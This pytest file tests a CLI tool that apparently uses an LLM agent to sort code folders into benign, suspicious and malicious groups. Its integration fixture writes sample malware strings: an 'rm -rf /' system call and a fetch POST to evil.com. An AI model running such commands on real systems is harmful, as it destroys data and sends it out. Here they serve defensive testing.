"""
Test cases for the triage CLI command.
"""

import os
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import pytest

from cli.agents.first_responder import FirstResponder, TriageDecision
from cli.triage import triage_command, setup_triage_parser
from common.triage import run_triage


class TestFirstResponderBaseURL:
    """Test base URL derivation logic in FirstResponder."""

    def test_derive_base_url_explicit_override(self):
        """Test that explicit base_url parameter takes precedence."""
        agent = FirstResponder("dummy-key", "any-model", "https://custom-api.com/v1")
        assert agent.base_url == "https://custom-api.com/v1"

    def test_derive_base_url_mistral_models(self):
        """Test Mistral model URL derivation."""
        test_cases = [
            "mistral-large-2411",
            "mistral-medium-2508",
            "Mistral-Small",
            "custom-mistral-model",
        ]

        for model in test_cases:
            agent = FirstResponder("dummy-key", model)
            assert agent.base_url == "https://api.mistral.ai/v1", (
                f"Failed for model: {model}"
            )

    def test_derive_base_url_openai_models(self):
        """Test OpenAI model URL derivation."""
        test_cases = ["gpt-4o-mini", "gpt-3.5-turbo", "openai-gpt-4", "GPT-4-Custom"]

        for model in test_cases:
            agent = FirstResponder("dummy-key", model)
            assert agent.base_url == "https://api.openai.com/v1", (
                f"Failed for model: {model}"
            )

    def test_derive_base_url_claude_models(self):
        """Test Claude/Anthropic model URL derivation."""
        test_cases = [
            "claude-3-sonnet",
            "claude-3-opus",
            "anthropic-claude",
            "Claude-Haiku",
        ]

        for model in test_cases:
            agent = FirstResponder("dummy-key", model)
            assert agent.base_url == "https://api.anthropic.com/v1", (
                f"Failed for model: {model}"
            )

    def test_derive_base_url_llama_models(self):
        """Test LLaMA/Meta model URL derivation."""
        test_cases = [
            "llama-3.1-8b",
            "meta-llama-3",
            "LLaMA-2-70B",
            "custom-meta-model",
        ]

        for model in test_cases:
            agent = FirstResponder("dummy-key", model)
            assert agent.base_url == "https://api.together.xyz/v1", (
                f"Failed for model: {model}"
            )

    def test_derive_base_url_gemini_models(self):
        """Test Gemini/Google model URL derivation."""
        test_cases = [
            "gemini-1.5-pro",
            "google-gemini-flash",
            "Gemini-Ultra",
            "custom-google-model",
        ]

        for model in test_cases:
            agent = FirstResponder("dummy-key", model)
            assert agent.base_url == "https://generativelanguage.googleapis.com/v1", (
                f"Failed for model: {model}"
            )

    def test_derive_base_url_unknown_model_defaults_to_mistral(self):
        """Test that unknown models default to Mistral API."""
        unknown_models = [
            "random-model-xyz",
            "custom-proprietary-llm",
            "unknown-provider-model",
        ]

        for model in unknown_models:
            agent = FirstResponder("dummy-key", model)
            assert agent.base_url == "https://api.mistral.ai/v1", (
                f"Failed for model: {model}"
            )


class TestTriageCLIArguments:
    """Test CLI argument parsing and validation."""

    def setup_method(self):
        """Set up test parser."""
        import argparse

        self.parser = argparse.ArgumentParser()
        subparsers = self.parser.add_subparsers()
        setup_triage_parser(subparsers)

    def test_required_input_argument(self):
        """Test that input argument is required."""
        with pytest.raises(SystemExit):
            self.parser.parse_args(["triage"])

    def test_default_model_is_mistral_large(self):
        """Test that default model is mistral-large-2411."""
        args = self.parser.parse_args(["triage", "/test/path"])
        assert args.llm == "mistral-large-2411"

    def test_custom_model_accepted(self):
        """Test that custom model names are accepted."""
        args = self.parser.parse_args(
            ["triage", "/test/path", "--llm", "custom-model-name"]
        )
        assert args.llm == "custom-model-name"

    def test_base_url_optional(self):
        """Test that base-url is optional."""
        args = self.parser.parse_args(["triage", "/test/path"])
        assert getattr(args, "base_url", None) is None

        args = self.parser.parse_args(
            ["triage", "/test/path", "--base-url", "https://custom.api.com/v1"]
        )
        assert args.base_url == "https://custom.api.com/v1"

    def test_folder_name_customization(self):
        """Test custom folder names."""
        args = self.parser.parse_args(
            [
                "triage",
                "/test/path",
                "--benign",
                "clean",
                "--suspicious",
                "maybe",
                "--malicious",
                "dangerous",
            ]
        )
        assert args.benign == "clean"
        assert args.suspicious == "maybe"
        assert args.malicious == "dangerous"

    def test_api_key_optional_for_env_var(self):
        """Test that API key is optional (can use env var)."""
        args = self.parser.parse_args(["triage", "/test/path"])
        assert getattr(args, "llm_api_key", None) is None

    def test_default_output_directory(self):
        """Test that default output directory is 'triaged'."""
        args = self.parser.parse_args(["triage", "/test/path"])
        assert args.output == "triaged"

    def test_custom_output_directory(self):
        """Test that custom output directory can be specified."""
        args = self.parser.parse_args(
            ["triage", "/test/path", "--output", "my-results"]
        )
        assert args.output == "my-results"

    def test_default_strategy_is_concat(self):
        """Test that default strategy is concat."""
        args = self.parser.parse_args(["triage", "/test/path"])
        assert args.strategy == "concat"

    def test_strategy_choices_accepted(self):
        """Test that both concat and single strategies are accepted."""
        args = self.parser.parse_args(["triage", "/test/path", "--strategy", "concat"])
        assert args.strategy == "concat"

        args = self.parser.parse_args(["triage", "/test/path", "--strategy", "single"])
        assert args.strategy == "single"

    def test_invalid_strategy_rejected(self):
        """Test that invalid strategy choices are rejected."""
        with pytest.raises(SystemExit):
            self.parser.parse_args(["triage", "/test/path", "--strategy", "invalid"])


class TestTriageCommand:
    """Test the triage command execution."""

    def setup_method(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.test_input = Path(self.test_dir) / "test_input"
        self.test_input.mkdir()

        # Create test folders with sample files
        (self.test_input / "folder1").mkdir()
        (self.test_input / "folder1" / "test.py").write_text("print('hello')")

        (self.test_input / "folder2").mkdir()
        (self.test_input / "folder2" / "script.js").write_text("console.log('test')")

    def teardown_method(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)

    @patch.dict(os.environ, {"LLM_API_KEY": "test-api-key"})
    @patch("common.triage.FirstResponder")
    def test_api_key_from_environment(self, mock_first_responder):
        """Test that API key is read from environment variable."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent
        mock_agent.analyze_files_sync.return_value = TriageDecision(
            decision="benign", reasoning="Test decision"
        )

        # Create mock args
        args = Mock()
        args.input = str(self.test_input)
        args.llm = "mistral-large-2411"
        args.llm_api_key = None  # Not provided via CLI
        args.base_url = None
        args.output = "triaged"
        args.benign = "benign"
        args.suspicious = "suspicious"
        args.malicious = "malicious"
        args.strategy = "concat"
        args.quiet = False

        triage_command(args)

        # Verify FirstResponder was called with env var API key
        mock_first_responder.assert_called_once_with(
            "test-api-key", "mistral-large-2411", None
        )

    @patch("common.triage.FirstResponder")
    def test_api_key_from_argument_takes_precedence(self, mock_first_responder):
        """Test that CLI argument API key takes precedence over env var."""
        with patch.dict(os.environ, {"LLM_API_KEY": "env-key"}):
            mock_agent = Mock()
            mock_first_responder.return_value = mock_agent
            mock_agent.analyze_files_sync.return_value = TriageDecision(
                decision="benign", reasoning="Test decision"
            )

            args = Mock()
            args.input = str(self.test_input)
            args.llm = "mistral-large-2411"
            args.llm_api_key = "cli-key"  # Provided via CLI
            args.base_url = None
            args.output = "triaged"
            args.benign = "benign"
            args.suspicious = "suspicious"
            args.malicious = "malicious"
            args.strategy = "concat"
            args.quiet = False

            triage_command(args)

            # Verify FirstResponder was called with CLI API key
            mock_first_responder.assert_called_once_with(
                "cli-key", "mistral-large-2411", None
            )

    def test_nonexistent_input_path_error(self):
        """Test error handling for non-existent input path."""
        args = Mock()
        args.input = "/nonexistent/path"
        args.quiet = False

        with pytest.raises(SystemExit):
            triage_command(args)

    @patch("cli.triage.run_triage")  # Patch at the import location
    def test_custom_folder_names_passed_through(self, mock_run_triage):
        """Test that custom folder names are passed to run_triage."""
        args = Mock()
        args.input = str(self.test_input)
        args.llm = "test-model"
        args.llm_api_key = "test-key"
        args.base_url = "https://test.api.com/v1"
        args.output = "triaged"
        args.benign = "clean_files"
        args.suspicious = "questionable_files"
        args.malicious = "dangerous_files"
        args.strategy = "concat"
        args.quiet = True

        triage_command(args)

        mock_run_triage.assert_called_once_with(
            input_path=str(self.test_input),
            llm_model="test-model",
            api_key="test-key",
            base_url="https://test.api.com/v1",
            output_dir="triaged",
            benign_folder="clean_files",
            suspicious_folder="questionable_files",
            malicious_folder="dangerous_files",
            strategy="concat",
        )


class TestRunTriageFunction:
    """Test the main run_triage function."""

    def setup_method(self):
        """Set up test environment."""
        self.test_dir = tempfile.mkdtemp()
        self.test_input = Path(self.test_dir) / "test_input"
        self.test_input.mkdir()

        # Create test structure
        (self.test_input / "benign_folder").mkdir()
        (self.test_input / "benign_folder" / "safe.py").write_text("print('safe code')")

        (self.test_input / "malicious_folder").mkdir()
        (self.test_input / "malicious_folder" / "bad.py").write_text(
            "exec('malicious code')"
        )

    def teardown_method(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        # Clean up any output directories created during tests
        for output_dir in ["triaged", "custom_output", "custom_results"]:
            output_path = Path(output_dir).resolve()
            if output_path.exists():
                shutil.rmtree(output_path)

    @patch("common.triage.FirstResponder")
    def test_folders_created_with_custom_names(self, mock_first_responder):
        """Test that output folders are created with custom names."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent
        mock_agent.analyze_files_sync.side_effect = [
            TriageDecision(decision="benign", reasoning="Safe code"),
            TriageDecision(decision="malicious", reasoning="Dangerous code"),
        ]

        run_triage(
            input_path=str(self.test_input),
            llm_model="test-model",
            api_key="test-key",
            base_url="https://test.api.com/v1",
            output_dir="custom_output",
            benign_folder="safe_files",
            suspicious_folder="maybe_files",
            malicious_folder="bad_files",
        )

        # Check that folders were created with custom names - independent directory
        results_dir = Path("custom_output").resolve()
        assert (results_dir / "safe_files").exists()
        assert (results_dir / "maybe_files").exists()
        assert (results_dir / "bad_files").exists()

    @patch("common.triage.FirstResponder")
    def test_folders_organized_correctly(self, mock_first_responder):
        """Test that folders are moved to correct categories."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent
        mock_agent.analyze_files_sync.side_effect = [
            TriageDecision(decision="benign", reasoning="Safe code"),
            TriageDecision(decision="malicious", reasoning="Dangerous code"),
        ]

        run_triage(
            input_path=str(self.test_input), llm_model="test-model", api_key="test-key"
        )

        results_dir = Path("triaged").resolve()

        # Check benign folder was moved correctly
        assert (results_dir / "benign" / "benign_folder" / "safe.py").exists()

        # Check malicious folder was moved correctly
        assert (results_dir / "malicious" / "malicious_folder" / "bad.py").exists()

        # Check suspicious folder is empty
        assert (results_dir / "suspicious").exists()
        assert len(list((results_dir / "suspicious").iterdir())) == 0

    def test_invalid_input_path_raises_error(self):
        """Test that invalid input path raises ValueError."""
        with pytest.raises(ValueError, match="Path does not exist"):
            run_triage(
                input_path="/nonexistent/path",
                llm_model="test-model",
                api_key="test-key",
            )

    def test_file_input_raises_error(self):
        """Test that providing a file instead of directory raises error."""
        test_file = Path(self.test_dir) / "test_file.py"
        test_file.write_text("test")

        with pytest.raises(ValueError, match="Path must be a directory"):
            run_triage(
                input_path=str(test_file), llm_model="test-model", api_key="test-key"
            )

    @patch("common.triage.FirstResponder")
    def test_custom_output_directory(self, mock_first_responder):
        """Test that custom output directory is used."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent
        mock_agent.analyze_files_sync.return_value = TriageDecision(
            decision="benign", reasoning="Safe code"
        )

        run_triage(
            input_path=str(self.test_input),
            llm_model="test-model",
            api_key="test-key",
            output_dir="custom_results",
        )

        # Check that custom output directory was created - independent directory
        results_dir = Path("custom_results").resolve()
        assert results_dir.exists()
        assert (results_dir / "benign").exists()
        assert (results_dir / "suspicious").exists()
        assert (results_dir / "malicious").exists()

    @patch("common.triage.FirstResponder")
    def test_concat_strategy_calls_analyze_once_per_folder(self, mock_first_responder):
        """Test that concat strategy calls analyze_files_sync once per folder."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent
        mock_agent.analyze_files_sync.return_value = TriageDecision(
            decision="benign", reasoning="Safe code"
        )

        run_triage(
            input_path=str(self.test_input),
            llm_model="test-model",
            api_key="test-key",
            strategy="concat",
        )

        # Should be called once for each folder (benign_folder and malicious_folder)
        assert mock_agent.analyze_files_sync.call_count == 2

        # Check that concatenated content is passed
        calls = mock_agent.analyze_files_sync.call_args_list
        for call in calls:
            content = call[0][0]  # First argument
            assert "### FILE:" in content  # Concatenated format

    @patch("common.triage.FirstResponder")
    def test_single_strategy_calls_analyze_per_file(self, mock_first_responder):
        """Test that single strategy calls analyze_files_sync once per file."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent
        mock_agent.analyze_files_sync.return_value = TriageDecision(
            decision="benign", reasoning="Safe file"
        )

        run_triage(
            input_path=str(self.test_input),
            llm_model="test-model",
            api_key="test-key",
            strategy="single",
        )

        # Should be called once for each file (safe.py and bad.py)
        assert mock_agent.analyze_files_sync.call_count == 2

        # Check that individual file content is passed
        calls = mock_agent.analyze_files_sync.call_args_list
        for call in calls:
            content = call[0][0]  # First argument
            assert "### FILE:" in content  # Individual file format
            # Should not contain multiple FILE markers in single mode
            assert content.count("### FILE:") == 1

    @patch("common.triage.FirstResponder")
    def test_single_strategy_aggregates_decisions_malicious_priority(
        self, mock_first_responder
    ):
        """Test that single strategy prioritizes malicious decisions correctly."""
        # Create a fresh test directory with only the mixed folder
        test_dir = Path(self.test_dir) / "test_mixed"
        test_dir.mkdir()

        # Create test folder with 2 files
        test_folder = test_dir / "mixed_folder"
        test_folder.mkdir()
        (test_folder / "safe.py").write_text("print('safe')")
        (test_folder / "bad.py").write_text("exec('malicious')")

        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent

        # Mock decisions: first file benign, second file malicious
        mock_agent.analyze_files_sync.side_effect = [
            TriageDecision(decision="benign", reasoning="Safe file"),
            TriageDecision(decision="malicious", reasoning="Dangerous file"),
        ]

        run_triage(
            input_path=str(test_dir),
            llm_model="test-model",
            api_key="test-key",
            strategy="single",
        )

        results_dir = Path("triaged").resolve()

        # Folder should be classified as malicious due to one malicious file
        assert (results_dir / "malicious" / "mixed_folder").exists()

    @patch("common.triage.FirstResponder")
    def test_single_strategy_aggregates_decisions_suspicious_fallback(
        self, mock_first_responder
    ):
        """Test that single strategy falls back to suspicious when no malicious files."""
        # Create a fresh test directory with only the suspicious folder
        test_dir = Path(self.test_dir) / "test_suspicious"
        test_dir.mkdir()

        # Create test folder with 2 files
        test_folder = test_dir / "mixed_folder"
        test_folder.mkdir()
        (test_folder / "safe.py").write_text("print('safe')")
        (test_folder / "questionable.py").write_text("import subprocess")

        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent

        # Mock decisions: first file benign, second file suspicious
        mock_agent.analyze_files_sync.side_effect = [
            TriageDecision(decision="benign", reasoning="Safe file"),
            TriageDecision(decision="suspicious", reasoning="Questionable file"),
        ]

        run_triage(
            input_path=str(test_dir),
            llm_model="test-model",
            api_key="test-key",
            strategy="single",
        )

        results_dir = Path("triaged").resolve()

        # Folder should be classified as suspicious due to one suspicious file
        assert (results_dir / "suspicious" / "mixed_folder").exists()

    @patch("common.triage.FirstResponder")
    def test_single_strategy_all_benign_classification(self, mock_first_responder):
        """Test that single strategy classifies folder as benign when all files are benign."""
        # Create a fresh test directory with only the benign folder
        test_dir = Path(self.test_dir) / "test_benign"
        test_dir.mkdir()

        # Create test folder with 2 benign files
        test_folder = test_dir / "clean_folder"
        test_folder.mkdir()
        (test_folder / "safe1.py").write_text("print('hello')")
        (test_folder / "safe2.py").write_text("def helper(): pass")

        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent

        # Mock decisions: both files benign
        mock_agent.analyze_files_sync.side_effect = [
            TriageDecision(decision="benign", reasoning="Safe file 1"),
            TriageDecision(decision="benign", reasoning="Safe file 2"),
        ]

        run_triage(
            input_path=str(test_dir),
            llm_model="test-model",
            api_key="test-key",
            strategy="single",
        )

        results_dir = Path("triaged").resolve()

        # Folder should be classified as benign when all files are benign
        assert (results_dir / "benign" / "clean_folder").exists()


class TestIntegrationScenarios:
    """Integration test scenarios combining multiple components."""

    def setup_method(self):
        """Set up complex test scenario."""
        self.test_dir = tempfile.mkdtemp()
        self.test_input = Path(self.test_dir) / "malware_samples"
        self.test_input.mkdir()

        # Create realistic folder structure
        folders_and_files = {
            "legitimate_app": {
                "main.py": "import sys\nprint('Hello World')",
                "utils.py": "def helper(): pass",
                "config.js": "const config = {debug: false};",
            },
            "suspicious_package": {
                "setup.py": "import subprocess\nsubprocess.call(['ls', '-la'])",
                "init.py": "import base64\nprint('suspicious')",
            },
            "clear_malware": {
                "backdoor.py": "import os\nos.system('rm -rf /')",
                "c2.js": "fetch('http://evil.com/upload', {method: 'POST'})",
            },
        }

        for folder, files in folders_and_files.items():
            folder_path = self.test_input / folder
            folder_path.mkdir()
            for filename, content in files.items():
                (folder_path / filename).write_text(content)

    def teardown_method(self):
        """Clean up test environment."""
        shutil.rmtree(self.test_dir)
        # Clean up any output directories created during tests
        for output_dir in ["triaged"]:
            output_path = Path(output_dir).resolve()
            if output_path.exists():
                shutil.rmtree(output_path)

    @patch("common.triage.FirstResponder")
    def test_realistic_triage_scenario(self, mock_first_responder):
        """Test realistic triage with mixed benign/suspicious/malicious content."""
        mock_agent = Mock()
        mock_first_responder.return_value = mock_agent

        # Mock realistic decisions based on folder names
        def mock_analyze(content):
            if "legitimate_app" in content:
                return TriageDecision(
                    decision="benign", reasoning="Standard application code"
                )
            elif "suspicious_package" in content:
                return TriageDecision(
                    decision="suspicious", reasoning="Uses subprocess and base64"
                )
            elif "clear_malware" in content:
                return TriageDecision(
                    decision="malicious", reasoning="Contains destructive commands"
                )
            else:
                return TriageDecision(
                    decision="suspicious", reasoning="Unknown content"
                )

        mock_agent.analyze_files_sync.side_effect = mock_analyze

        run_triage(
            input_path=str(self.test_input),
            llm_model="mistral-large-2411",
            api_key="test-key",
            benign_folder="clean",
            suspicious_folder="review",
            malicious_folder="quarantine",
        )

        results_dir = Path("triaged").resolve()

        # Verify correct categorization
        assert (results_dir / "clean" / "legitimate_app").exists()
        assert (results_dir / "review" / "suspicious_package").exists()
        assert (results_dir / "quarantine" / "clear_malware").exists()

        # Verify file contents preserved
        assert (
            results_dir / "clean" / "legitimate_app" / "main.py"
        ).read_text() == "import sys\nprint('Hello World')"
        assert (
            results_dir / "quarantine" / "clear_malware" / "backdoor.py"
        ).read_text() == "import os\nos.system('rm -rf /')"

    def test_empty_directory_handling(self):
        """Test handling of directory with no subdirectories."""
        empty_dir = Path(self.test_dir) / "empty"
        empty_dir.mkdir()

        # Add a single file to the root
        (empty_dir / "lone_file.py").write_text("print('alone')")

        with patch("common.triage.FirstResponder") as mock_first_responder:
            mock_agent = Mock()
            mock_first_responder.return_value = mock_agent
            mock_agent.analyze_files_sync.return_value = TriageDecision(
                decision="benign", reasoning="Simple script"
            )

            run_triage(
                input_path=str(empty_dir), llm_model="test-model", api_key="test-key"
            )

            # Should analyze the root directory itself
            results_dir = Path("triaged").resolve()
            assert results_dir.exists()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
